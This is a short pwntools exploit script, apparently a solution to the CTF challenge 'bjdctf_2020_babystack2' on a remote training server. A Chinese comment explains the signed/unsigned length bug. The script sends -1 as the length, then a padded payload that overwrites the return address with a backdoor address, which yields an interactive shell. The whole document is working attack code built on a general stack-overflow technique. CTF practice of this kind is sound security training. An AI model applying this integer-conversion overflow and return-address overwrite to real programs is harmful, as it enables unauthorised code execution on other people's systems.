from pwn import *

'''
考点：(unsigned int)nbytes 转换问题：
if ( (int)nbytes > 10 ) 判断为 false（因为 -1 < 10），不会触发退出
(unsigned int)nbytes 将 -1 转换为 极大的无符号数（如 0xFFFFFFFF）
read(0, buf, 0xFFFFFFFF) 会尝试读取 约 4GB 数据 到 buf（仅 16 字节），导致 缓冲区溢出
'''

context.log_level = 'debug'

r = remote('node5.buuoj.cn', 28429)
file = ELF(r'../bjdctf_2020_babystack2')

# bash_addr = 0x4008B8
# system_addr = 0x4005c0
system_addr = file.sym['system']
bash_addr = file.search(b'/bin/sh').__next__()
print(hex(system_addr))
print(hex(bash_addr))

backdoor_addr = 0x400726

payload = b'A' * (0x10 + 8) + p64(backdoor_addr)

r.sendlineafter('Please input the length of your name:', '-1')
r.sendlineafter("What's u name?", payload)
r.interactive()
